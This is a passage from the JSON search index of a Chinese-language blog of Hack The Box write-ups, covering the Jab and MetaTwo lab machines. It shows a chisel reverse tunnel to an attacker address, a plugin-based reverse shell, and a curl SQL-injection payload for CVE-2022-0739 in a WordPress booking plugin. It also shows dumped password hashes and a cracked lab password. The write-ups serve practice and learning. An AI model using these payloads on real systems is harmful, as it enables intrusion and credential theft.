like)","text":"","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#chisel","title":"chisel\u914d\u7f6e\u7aef\u53e3\u8f6c\u53d1","text":"<p>\u9996\u5148\u914d\u7f6e\u7aef\u53e3\u8f6c\u53d1\uff0c\u672c\u6765\u60f3\u8ddf\u4e4b\u524d\u4e00\u6837\u7528SilverC2\u6216msf\uff0c\u6b63\u597d\u5728\u684c\u9762\u770b\u5230\u524d\u4eba\u7559\u4e0b\u7684chisel\uff08\u6587\u4ef6\u4e0a\u4f20\u65b9\u6cd5\u5728\u6b64\u4e5f\u5c31\u7701\u7565\u4e86\uff0c\u53ef\u53c2\u8003HTB-Authority\uff09\uff0c\u4ee5\u524d\u4e5f\u6ca1\u7528\u8fc7\uff0c\u90a3\u8fd9\u6b21\u5c31\u8bd5\u8bd5chisel\u5427\u3002 \u5176\u5b9e\u770bhelp\u6ca1\u592a\u61c2\u600e\u4e48\u7528\uff0c\u641c\u4e86\u4e0b\uff0c\u8fd8\u5f97\u662fHacktricks\u554a\uff1a <pre><code>chisel server -p 12312 --reverse    #Server -- Attacker\n./chisel.exe client 10.10.14.14:12312 R:9090:127.0.0.1:9090    #Client -- Victim\n</code></pre></p> <p>\u914d\u7f6e\u5b8c\u6210\u540e\u6d4f\u89c8\u5668\u8bbf\u95ee\uff0c\u6210\u529f\u663e\u793aconsole\u767b\u5f55\u754c\u9762\uff1a</p> <p></p> <p>\u63a5\u4e0b\u6765\u5c31\u662f\u6309\u7167github\u5927\u4f6c\u7684exp\u4e86\u3002</p> <p>\u4e0d\u8fc7\uff0c\u6267\u884cexp\u540e\u7528\u65b0\u521b\u5efa\u7684\u7528\u6237\u767b\u5f55\u4f1a\u5931\u8d25\uff1a</p> <p></p> <p>\u8fd9\u4e5f\u6b63\u5e38\uff0c\u53ef\u4ee5\u53d1\u73b0\u767b\u5f55\u754c\u9762\u5199\u4e86\u7248\u672c<code>4.7.5</code>\uff0c\u800c<code>CVE-2023-32315</code>\u4e5f\u6b63\u597d\u5728\u8fd9\u4e2a\u7248\u672c\u4fee\u590d\u4e86\u3002</p> <p>The problem has been patched in Openfire release 4.7.5...</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#shell","title":"\u63d2\u4ef6\u6f0f\u6d1e\u83b7\u5f97\u53cd\u5f39shell","text":"<p>\u4f46\u662f\uff0c\u6211\u4eec\u53ef\u4ee5\u7528<code>svc_openfire</code>\u8d26\u6237\u6210\u529f\u767b\u9646\uff1a </p> <p>\u7ee7\u7eed\u8bd5\u8bd5\u8fd9\u4e2a\u63d2\u4ef6\u80fd\u5426\u4f7f\u7528\uff0c </p> <p>\u7ecf\u8fc7\u548c\u4e4b\u524d\u4e00\u6837\u7684ping\u65b9\u5f0f\u9a8c\u8bc1\uff0c\u8fd9\u4e2a\u63d2\u4ef6\u8fd8\u662f\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u547d\u4ee4\uff0c\u4e8e\u662f\u6beb\u4e0d\u72b9\u8c6b\u6267\u884c\u53cd\u5f39shell\u547d\u4ee4\uff0c\u6210\u529fgetshell\uff1a </p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#flag-root","title":"flag: root","text":"<pre><code>PS C:\\Users\\administrator\\desktop&gt; ls\n\n\n    Directory: C:\\Users\\administrator\\desktop\n\n\nMode                LastWriteTime         Length Name                                                                  \n----                -------------         ------ ----                                                                  \n-ar---        3/24/2024   3:20 AM             34 root.txt                                                              \n\n\nPS C:\\Users\\administrator\\desktop&gt; cat root.txt\n1b68 (...) 8776\n</code></pre>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#_2","title":"\u603b\u7ed3\u00b7\u540e\u8bb0","text":"<p>2024/03/22</p> <p>\u8fd9\u7b80\u76f4\u662f\u6211\u6253\u8fc7\u7684\u6700\u6709\u8da3\u7684Windows\u9776\u673a\u4e86\u3002 \u4e00\u90e8\u5206\u662f\u56e0\u4e3a\u5229\u7528\u8fd9\u4efd\u57df\u6e17\u900f\u601d\u7ef4\u5bfc\u56fe\uff0c\u8ba9\u6211\u4f53\u9a8c\u4e86\u591a\u79cd\u4ee5\u524d\u672a\u4f7f\u7528\u8fc7\u7684\u5de5\u5177\uff0c\u5305\u62ecchisel\u3002 \u53e6\u4e00\u65b9\u9762\uff0copenfire\u7684\u7ebf\u7d22\u8bbe\u8ba1\u592a\u68d2\u4e86\u3002\u4e00\u5f00\u59cb\u4ee5\u4e3a\u662f\u7acb\u8db3\u7528\u7684\uff0c\u60f3\u7740\u7adf\u7136\u8fd9\u4e48\u5bb9\u6613\u5c31\u627e\u5230\u662f\u5229\u7528CVE-2023-32315\uff1f\u7136\u540e\u53d1\u73b0\u8c37\u6b4c\u76f4\u63a5\u641c\u51fa\u6765\u7684\u8fd9\u4e2aCVE\u6839\u672c\u7528\u4e0d\u4e0a\uff0c\u4e8e\u662f\u7ee7\u7eed\u8fdb\u884c\u63a2\u7d22\u5e76\u7acb\u8db3\u3002\u6700\u540e\u7adf\u7136\u662f\u5728\u63d0\u6743\u4e2d\u6d89\u53ca\u8fd9\u4e2aCVE\uff0c\u5e76\u4e14\u9776\u673a\u662f\u7ed9\u4e86\u4e2aCVE-2023-32315\u5df2\u4fee\u590d\u7684\u7248\u672c\u3002\u4e00\u5f00\u59cb\u7591\u60d1\u7740\u8fd9\u4e2aCVE\u679c\u7136\u8fd8\u662f\u4e0d\u7ba1\u7528\u4e86\uff0c\u7ed3\u679c\u7adf\u7136\u662f\u62ff\u7740\u624b\u5934\u4e0a\u7684\u5df2\u77e5\u51ed\u636e\u80fd\u767b\u9646\u7ba1\u7406\u754c\u9762\uff0c\u7136\u540e\u53c8\u80fd\u5229\u7528CVE-2023-32315\u4e2d\u63d0\u5230\u7684\u63d2\u4ef6\u6267\u884cRCE\u6765\u63d0\u6743\u3002\u591a\u6b21\u7275\u5f15\u53c8\u6253\u4e71\u5bf9\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u601d\u7ef4\u5173\u8054\uff0c\u6700\u7ec8\u8fd8\u662f\u67f3\u6697\u82b1\u660e\uff0c\u8bbe\u8ba1\u5f97\u5341\u5206\u6709\u8da3\u3002</p> <p>\u5173\u4e8eExecuteDCOM\uff0c \u540e\u6765\u590d\u76d8\u7ed3\u5408\u4e0a\u9762DCOM\u5229\u7528\u65b9\u6cd5\u7684\u6587\u7ae0\uff0c\u518d\u53bb\u786e\u8ba4\u4e86\u4e0b\u8fd9\u4e2a\u7528\u6237\u7684\u7ec4\u662f\u5426\u6709\u91cc\u9762\u63d0\u5230\u7684<code>Distributed COM Users</code>\u2014\u2014\u8fd8\u771f\u6709\uff0c\u539f\u6765\u8fd9\u5c31\u662f\u53ef\u5229\u7528\u7684\u539f\u56e0\u554a\u3002</p> <pre><code>PS C:\\windows\\system32&gt; whoami /all\n\nUSER INFORMATION\n----------------\n\nUser Name        SID                                         \n================ ============================================\njab\\svc_openfire S-1-5-21-715914501-2118353807-243417633-1104\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                  Type             SID          Attributes                                        \n=========================================== ================ ============ ==================================================\nEveryone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Distributed COM Users               Alias            S-1-5-32-562 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Plus Mandatory Level Label            S-1-16-8448                                                    \n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State  \n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n\n\nUSER CLAIMS INFORMATION\n-----------------------\n\nUser claims unknown.\n\nKerberos support for Dynamic Access Control on this device has been disabled.\n</code></pre>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-MetaTwo/","title":"HTB-MetaTwo","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MetaTwo/#_1","title":"\u626b\u63cf","text":"<p>\u5148\u7528\u81ea\u5df1\u5199\u7684\u8fd9\u4e2a\u811a\u672c\u8fdb\u884c\u9996\u5148\u7684\u57fa\u7840\u626b\u63cf</p> <ul> <li>\u5f00\u653e\u7aef\u53e3\uff1a21, 22, 80</li> <li>\u6ca1\u53d1\u73b0\u5b50\u57df</li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MetaTwo/#_2","title":"\u6f0f\u6d1e\u5206\u6790","text":"<p>21\u7aef\u53e3\u8bd5\u4e86\u4e0b\u533f\u540d\u8fde\u63a5\u5931\u8d25\u3002  </p> <p>22\u7aef\u53e3\u5148\u4e0d\u8003\u8651\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MetaTwo/#80","title":"80\u7aef\u53e3","text":"<p><code>http://metapress.htb/</code></p> <ul> <li> <p>robots.txt</p> <pre><code>User-agent: *\nDisallow: /wp-admin/\nAllow: /wp-admin/admin-ajax.php\n\nSitemap: http://metapress.htb/wp-sitemap.xml\n</code></pre> <ul> <li><code>http://metapress.htb/wp-admin/</code> \u8fdb\u5165\u767b\u5f55\u9875\u9762\u3002\u7b80\u5355\u8bd5\u4e86\u4e0bSQLi\u4f3c\u4e4e\u884c\u4e0d\u901a</li> <li>\u201cSitemap\u201d\u65e0\u6cd5\u8bbf\u95ee\uff08\u4e0d\u8fc7\u540e\u6765\u53c8\u53ef\u4ee5\u4e86\u2026\u2026\u70b9\u4e86\u4e00\u4e9b\u94fe\u63a5\uff0c\u4f3c\u4e4e\u53ea\u662f\u5355\u7eaf\u7684\u9875\u9762\u8df3\u8f6c\uff09</li> </ul> </li> <li> <p>\u7f51\u9875\u6e90\u7801\u53d1\u73b0\uff1a</p> <ul> <li>WordPress ver=5.6.2</li> <li>/themes/twentytwentyone/style.css?ver=1.1</li> </ul> </li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MetaTwo/#wpscanoption","title":"WPscan\u626b\u63cf\uff08\u65e0option\uff09","text":"<p>\u65e2\u7136\u662fWordPress\uff0c\u90a3\u5c31\u5148\u7528WPscan\u626b\u4e00\u6ce2\uff1a <pre><code>Interesting Finding(s):\n\n[+] Headers\n | Interesting Entries:\n |  - Server: nginx/1.18.0\n |  - X-Powered-By: PHP/8.0.24\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] robots.txt found: http://metapress.htb/robots.txt\n | Interesting Entries:\n |  - /wp-admin/\n |  - /wp-admin/admin-ajax.php\n | Found By: Robots Txt (Aggressive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://metapress.htb/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\u2026\u2026\n</code></pre></p> <p>\u7531\u4e8e\u6700\u5f00\u59cb\u6ca1\u52a0\u53c2\u6570\u6f0f\u4e86\u5f88\u591a\u4fe1\u606f\uff0c\u4e8e\u662f\u5148\u53ea\u770b\u5230\u4e86\u8fd9\u51e0\u9879\u611f\u5174\u8da3\u7684\uff1a</p> <ul> <li>readme.txt  <pre><code>System Requirements\n\n    PHP version 5.6.20 or higher.\n    MySQL version 5.0 or higher.\n</code></pre> <ul> <li>\u540c\u65f6\u641c\u4e86\u4e0b\u4e4b\u524d\u5728\u7f51\u9875\u6e90\u7801\u91cc\u53d1\u73b0\u7684 <code>twentytwentyone</code> \u4e3b\u9898\uff08\u5728\u4e0a\u9762\u7684\u626b\u63cf\u7ed3\u679c\u4e2d\u7701\u7565\uff09\uff0c\u6ca1\u53d1\u73b0\u4ec0\u4e48\u53ef\u5229\u7528\u7684\u70b9</li> <li><code>XML-RPC</code>\u770bhacktricks\u4f3c\u4e4e\u53ef\u4ee5\u5229\u7528\uff0c\u4f46\u662f\u7531\u4e8e\u662f\u66b4\u7834\uff0c\u5728\u6211\u5fc3\u91cc\u7684\u4f18\u5148\u5ea6\u8f83\u4f4e\u3002\u6240\u4ee5\u6682\u65f6\u653e\u7f6e\uff0c\u5148\u770b\u770b\u6709\u6ca1\u6709\u5176\u4ed6\u7a81\u7834\u53e3</li> </ul> </li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MetaTwo/#_3","title":"\u7814\u7a76\u7f51\u9875\u529f\u80fd","text":"<ul> <li>\u9875\u9762\u4e0b\u65b9\u7684\u641c\u7d22\u6846\u3002\u7b80\u5355\u8bd5\u4e86\u4e0bSQLi\u3001XSS\u4f3c\u4e4e\u884c\u4e0d\u901a</li> <li>\u9875\u9762\u4e2d\u592e\u7684\u94fe\u63a5 <code>http://metapress.htb/events/</code>\u3002\u4f3c\u4e4e\u662f\u4e2a\u6ce8\u518c\u3001\u8ba2\u9605events\u7684\u4e1c\u897f\u3002\u6ca1\u53d1\u73b0\u6709\u4ec0\u4e48\u7528 \uff08\u6682\u65f6\uff09</li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MetaTwo/#xml-rpc","title":"XML-RPC\u66b4\u7834","text":"<p>\u7531\u4e8e\u6ca1\u4ec0\u4e48\u7a81\u7834\u70b9\uff0c\u4e0d\u5f97\u5df2\u5c1d\u8bd5\u4e00\u4e0b<code>XML-RPC</code>\u66b4\u7834\u3002 \u7528hacktricks\u91cc\u63d0\u5230\u7684\u81ea\u52a8\u811a\u672c\u8dd1\u4e86\u4e00\u6ce2\u9ed8\u8ba4\u5bc6\u7801\u5b57\u5178\uff08\u56e0\u4e3a\u89c9\u5f97\u5982\u679c\u601d\u8def\u5bf9\u7684\u8bdd\u5e94\u8be5\u4e0d\u4f1a\u5f88\u96be\uff0c\u90a3\u4e48\u7528\u9ed8\u8ba4\u5b57\u5178\u5373\u53ef\uff09 <pre><code>$ ./exploit.py http://metapress.htb 10 10\n__          _________   __      _       _ _\n\\ \\        / /  __ \\ \\ / /     | |     (_) |\n \\ \\  /\\  / /| |__) \\ V / _ __ | | ___  _| |_\n  \\ \\/  \\/ / |  ___/ &gt; &lt; | '_ \\| |/ _ \\| | __|\n   \\  /\\  /  | |    / . \\| |_) | | (_) | | |_\n    \\/  \\/   |_|   /_/ \\_\\ .__/|_|\\___/|_|\\__|\n                         | |   [Version 1.0.0]\n                         |_|\n\n[7:53:46] URL is valid!\n[7:53:46] connection is successfully establised!\n[7:53:46] please provide the username : admin\n[7:53:50] 0. wordlist/default.txt\n[7:53:50] select your file number : 0\n[7:54:9]: 100%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 1/1 [00:01&lt;00:00,  1.21s/it]\n[8:20:49] Connection error due to HTTPConnectionPool(host='metapress.htb', port=80): Max retries exceeded with url: /xmlrpc.php (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f9dd2536290&gt;, 'Connection to metapress.htb timed out. (connect timeout=10)'))                                                                \n[7:54:8]:  58%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258f                          | 5811/10000 [26:40&lt;19:13,  3.63it/s]\n[8:20:50] Connection error due to HTTPConnectionPool(host='metapress.htb', port=80): Read timed out. (read timeout=10)                                                                                                                  \n[7:54:7]:  57%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258e                           | 5665/10000 [26:43&lt;20:26,  3.53it/s]\n[8:20:50] Connection error due to HTTPConnectionPool(host='metapress.htb', port=80): Read timed out. (read timeout=10)                                                                                                                  \n[7:54:6]:  57%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258c                           | 5708/10000 [26:44&lt;20:06,  3.56it/s]\n[8:20:50] Connection error due to HTTPConnectionPool(host='metapress.htb', port=80): Read timed out. (read timeout=10)                                                                                                                  \n[7:54:7]:  57%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258b                           | 5742/10000 [26:42&lt;19:48,  3.58it/s]\n[8:20:50] Connection error due to HTTPConnectionPool(host='metapress.htb', port=80): Read timed out. (read timeout=10)                                                                                                                  \n[7:54:6]:  56%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258b                            | 5579/10000 [26:44&lt;21:11,  3.48it/s]\n[8:20:50] Connection error due to HTTPConnectionPool(host='metapress.htb', port=80): Read timed out. (read timeout=10):54:6]:  56%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258c                            | 5565/10000 [26:43&lt;34:22,  2.15it/s]\n[7:54:6]:  56%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588                            | 5640/10000 [26:43&lt;20:39,  3.52it/s]\n[8:20:50] Connection error due to HTTPConnectionPool(host='metapress.htb', port=80): Read timed out. (read timeout=10):54:6]:  56%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258c                            | 5565/10000 [26:43&lt;34:22,  2.15it/s]\n[7:54:9]:  58%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258a                           | 5758/10000 [26:41&lt;19:39,  3.60it/s]\n[8:20:50] Connection error due to HTTPConnectionPool(host='metapress.htb', port=80): Max retries exceeded with url: /xmlrpc.php (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f9de8913250&gt;, 'Connection to metapress.htb timed out. (connect timeout=10)'))                                                                \n[7:54:7]:  57%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258d                           | 5703/10000 [26:43&lt;20:08,  3.56it/s]\n[8:20:50] Connection error due to HTTPConnectionPool(host='metapress.htb', port=80): Read timed out. (read timeout=10):54:6]:  56%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258c                            | 5565/10000 [26:43&lt;34:22,  2.15it/s]\n[7:54:6]:  56%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258c                            | 5565/10000 [26:43&lt;21:18,  3.47it/s]\n[8:20:50] Connection error due to HTTPConnectionPool(host='metapress.htb', port=80): Max retries exceeded with url: /xmlrpc.php (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f9de8913760&gt;, 'Connection to metapress.htb timed out. (connect timeout=10)'))\n[7:54:8]:  56%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588                            | 5629/10000 [26:41&lt;20:43,  3.51it/s]\n[8:20:50] all task are done! \n</code></pre></p> <p>\u4f3c\u4e4e\u8981\u633a\u4e45\u7684\uff0c\u5148\u6d17\u4e86\u4e2a\u6fa1\u2026\u2026\u56de\u6765\u53d1\u73b0\u66b4\u7834\u4e2d\u9014\u65ad\u4e86\u2026\u2026</p> <p>\u7f51\u9875\u8bbf\u95ee\u8bd5\u4e86\u4e0b\u4e5f\u4e0d\u662f\u88abban IP\uff0c\u6709\u70b9\u8c1c\u3002\u6216\u8005\u662f\u5df2\u7ecf\u8fc7\u4e86\u88abban\u7684\u65f6\u95f4\uff1f \u4e0d\u8fc7\u66b4\u7834\u4e86\u8fd9\u4e48\u4e45\u4e0d\u884c\u611f\u89c9\u5e94\u8be5\u4e0d\u662f\u8fd9\u4e2a\u601d\u8def\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MetaTwo/#wpscanoption_1","title":"WPscan\u626b\u63cf\uff08\u6709option\uff09","text":"<p>\u5176\u5b9e\u662f\u7b2c\u4e00\u6b21\u6253WordPress\u2026\u2026\u641c\u4e86\u4e00\u4e0bWPscan\u7684\u7528\u6cd5\u540e\u52a0\u4e0a\u53c2\u6570\u518d\u626b\u4e86\u4e00\u6ce2\uff1a <pre><code>$ wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://metapress.htb/ --plugins-detection aggressive\n\n\u2026\u2026\n\n[i] Plugin(s) Identified:\n\n[+] bookingpress-appointment-booking\n | Location: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/\n | Last Updated: 2022-12-13T11:42:00.000Z\n | Readme: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt\n | [!] The version is out of date, the latest version is 1.0.49\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/, status: 200\n |\n | Version: 1.0.10 (100% confidence)\n | Found By: Readme - Stable Tag (Aggressive Detection)\n |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt\n | Confirmed By: Translation File (Aggressive Detection)\n |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/languages/bookingpress-appointment-booking-en_US.po, Match: 'sion: BookingPress Appointment Booking v1.0.10'\n\n\u2026\u2026\n\n[i] User(s) Identified:\n\n[+] admin\n | Found By: Author Posts - Author Pattern (Passive Detection)\n | Confirmed By:\n |  Rss Generator (Passive Detection)\n |  Wp Json Api (Aggressive Detection)\n |   - http://metapress.htb/wp-json/wp/v2/users/?per_page=100&amp;page=1\n |  Rss Generator (Aggressive Detection)\n |  Author Sitemap (Aggressive Detection)\n |   - http://metapress.htb/wp-sitemap-users-1.xml\n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n |  Login Error Messages (Aggressive Detection)\n\n[+] manager\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n | Confirmed By: Login Error Messages (Aggressive Detection)\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MetaTwo/#poccve-2022-0739","title":"PoC\uff08CVE-2022-0739\uff09","text":"<p>\u53d1\u73b0\u4e86\u4e00\u4e2a\u7591\u4f3c\u6709\u6f0f\u6d1e\u7684\u63d2\u4ef6\u3002\u8c37\u6b4c\u4e00\u6ce2\u770b\u5230\u8fd9\u4e2aPoC: <pre><code>curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \\\n  --data 'action=bookingpress_front_get_category_services&amp;_wpnonce=8cc8b79544&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'\n</code></pre></p> <p>\u4e00\u5f00\u59cb\u6ca1\u61c2\uff0c\u76f4\u63a5\u590d\u5236\u8bd5\u4e86\u51e0\u6b21\u4f3c\u4e4e\u4e0d\u884c\u3002 \u540e\u6765\u770b\u5230\u8fd9\u4e2aPython PoC\uff0c\u56e0\u4e3a\u5fc5\u987b\u8981\u8f93\u5165\u4e00\u4e2a <code>nonce</code> \u968f\u673a\u6570\uff0c\u968f\u624b\u8bd5\u4e86\u51e0\u4e2a\u90fd\u62a5\u9519\uff0c\u5c31\u8ff7\u832b\u4e86\u5f88\u4e45\u2026\u2026 \u4e5f\u60f3\u4e0d\u5230\u5176\u4ed6\u53ef\u5229\u7528\u7684\u70b9\uff0c\u9664\u975e\u6362\u4e2a\u5bc6\u7801\u5b57\u5178\u7528rockyou\u7ee7\u7eed\u53bb\u66b4\u7834admin\u548cmanager\uff0c\u4f46\u662f\u53c8\u62c5\u5fc3\u4e2d\u9014\u65ad\u4e86\u3002\u800c\u4e14\u5728\u7ebf\u66b4\u7834\u5e76\u4e0d\u597d\uff0c\u5e94\u8be5\u4e0d\u662f\u8fd9\u4e48\u8822\u7684\u65b9\u5f0f\u3002</p> <p>\u540e\u9762\u53c8\u4ed4\u7ec6\u770b\u4e86\u770bPoC\u7684\u63cf\u8ff0\uff0c\u4f3c\u4e4e\u662f\u8bf4POST\u8fc7\u7684\u6570\u636e\u672a\u6e05\u7406\u3002 \u60f3\u8d77\u6765\u7f51\u9875\u4e5f\u5c31event\u90a3\u4e2a\u8ba2\u9605\u6709POST\u8fc7\u6570\u636e\u3002 Burp\u5176\u5b9e\u5728\u6700\u5f00\u59cb\u5c31\u5f00\u4e86\u7684\uff0c\u770b\u4e86\u773chistory\uff0c\u5728POST\u6570\u636e\u91cc\u53d1\u73b0\u4e86 <code>_wpnonce</code> \u8fd9\u4e2a\u53c2\u6570\uff01\u5f00\u6574\uff01</p> <p>\u83b7\u5f97\u4e24\u4f4d\u7528\u6237\u7684hash\uff1a <pre><code>$ python booking-press-expl.py -u 'http://metapress.htb' -n afab51c6c0\n- BookingPress PoC\n-- Got db fingerprint:  10.5.15-MariaDB-0+deb11u1\n-- Count of users:  2\n|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|\n|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MetaTwo/#johnhash","title":"john\u66b4\u7834hash","text":"<pre><code>$ john --show --format=phpass hash.txt \nmanager:partylikearockstar\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MetaTwo/#wordpress","title":"\u767b\u9646WordPress","text":"<p>admin\u8d26\u53f7\u6ca1\u6709\u66b4\u7834\u6210\u529f\u3002\u59d1\u4e14\u7528manager\u767b\u9646\u4e00\u4e0bWordPress\u3002 